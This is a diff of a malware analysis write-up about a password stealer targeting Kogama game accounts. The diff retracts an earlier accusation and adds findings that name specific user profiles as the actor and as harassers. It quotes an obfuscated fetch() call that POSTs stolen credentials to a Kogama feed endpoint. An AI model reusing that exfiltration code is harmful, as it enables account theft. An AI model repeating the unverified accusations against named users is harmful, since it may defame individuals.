@@ -66,7 +66,7 @@ function _0x22fc() {
 2. **Data Exfiltration**
    - Transmits stolen credentials as a "comment" to a fixed Kogama.com feed ID
    - You can view the current state of comments from this object [here](https://www.kogama.com/api/feed/31872096/comment/)
-   - If you want to go a few steps ahead, you can compare your findings to what I've saved @ [May 31, 2025 20:24](https://github.com/vendicatedcore/kgmmlwr/blob/main/Lavar/Script/endpoint/comments.json)
+   - If you want to go a few steps ahead, you can compare your findings to what I've saved @ [May 31, 2025 20:24](https://github.com/vendicatedcore/kgmmlwr/blob/main/Inversion/Script/endpoint/comments.json)
 ```javascript
 fetch('https://www.kogama.com/api/feed/31872096/comment/', {
   'method': _0x5acfe3(0x1f3),  // Resolves to 'POST'
@@ -78,11 +78,11 @@ fetch('https://www.kogama.com/api/feed/31872096/comment/', {
   })
 ```
 
-As of [May 31, 2025 20:24](https://github.com/vendicatedcore/kgmmlwr/blob/main/Lavar/Script/endpoint/comments.json) the only accounts that have posted any comments under this specific Object are [GameCodeMaster](https://www.kogama.com/profile/670030842/) and a dummy account @ [Boris Jacob Anderson](https://www.kogama.com/profile/670351929/). Both of those have already changed passwords which could mean two twings. 
-Either the person behind this script is GameCodeMaster simply testing their own sample, or that account has been stolen because of their naive traits.
-Why such theory? GameCodeMaster is an owner of 'Tester' Badge, which these days - isn't rare, but it just may be an indicator.
+As of [May 31, 2025 20:24](https://github.com/vendicatedcore/kgmmlwr/blob/main/Inversion/Script/endpoint/comments.json) the only accounts that have posted any comments under this specific Object are ~~GameCodeMaster~~ and a dummy account @ [Boris Jacob Anderson](https://www.kogama.com/profile/670351929/). Both of those have already changed passwords which could mean two twings. 
+~~Either the person behind this script is GameCodeMaster simply testing their own sample, or that account has been stolen because of their naive traits.
+Why such theory? GameCodeMaster is an owner of 'Tester' Badge, which these days - isn't rare, but it just may be an indicator.~~
 
-What of the post/feed that stores the comments? - I'm still trying to locate it, trying to finalise the investigation.
+*What of the post/feed that stores the comments? - I'm still trying to locate it, trying to finalise the investigation.
 No hits in unpublished projects, deleted maps or anywhere else.
 Due to this issue - figuring out who's behind the script is currently impossible.
 
@@ -106,7 +106,7 @@ Due to this issue - figuring out who's behind the script is currently impossible
    - Persistence: Stored credentials in `localStorage` under key `'poop'`
 
 3. **Attribution Challenges**  
-   - Only two affected accounts detected ([GameCodeMaster](https://www.kogama.com/profile/670030842/) and [Boris Jacob Anderson](https://www.kogama.com/profile/670351929/))
+   - Only two affected accounts detected ~~GameCodeMaster~~ and [Boris Jacob Anderson](https://www.kogama.com/profile/670351929/))
    - Possible scenarios:
      * Attacker testing their own malware
      * Compromised naive accounts
@@ -130,5 +130,24 @@ Help expand this analysis by:
 2. Contributing YARA rules for detection
 3. Sharing related samples in the wild
 
-> **Final Note**: This remains an active investigation. Last updated: May 2025  
-> ![Malware Execution Flow](https://github.com/user-attachments/assets/50b0b399-baad-4b8b-b0e1-7dbb30eeb70f)
+---
+
+# FINAL INVESTIGATION RESULTS
+
+After thorough analysis, it has been determined that the initial hypothesis regarding GameCodeMaster being the threat actor was incorrect. In reality, GameCodeMaster was among three individuals who were coerced through blackmail into developing malicious scripts under the direction of an entity known as 'Inversion'.
+
+Two additional parties involved in this operation, who engaged in harassment and email spamming targeting the victims, have been identified as 'zinxi' and 'g0d_b3rn13'.
+
+> ![Evidence 1](https://github.com/user-attachments/assets/9f92350e-091d-4038-ae28-6f00e670ddf5)
+> ![Evidence 2](https://github.com/user-attachments/assets/4083e999-6c48-4bee-91dc-d2c6eaa8c4bc)
+
+## IDENTIFIED THREAT ACTOR
+**Primary Actor**: [__ChiefPuddle/Inversion__](https://www.kogama.com/profile/670201468/)  
+
+**Known Alternate Accounts**:  
+- [__Asood Moohammed243__](https://www.kogama.com/profile/670339973/)
+
+## ADDITIONAL FINDINGS
+The primary threat actor has been actively distributing password-stealer malware through comments on the profile of '[G0D_B3RN13](https://www.kogama.com/profile/669867874/)'.
+
+> ![Malware Distribution Evidence](https://github.com/user-attachments/assets/d009bf9d-c8cf-4da1-8c85-5e248c954596)
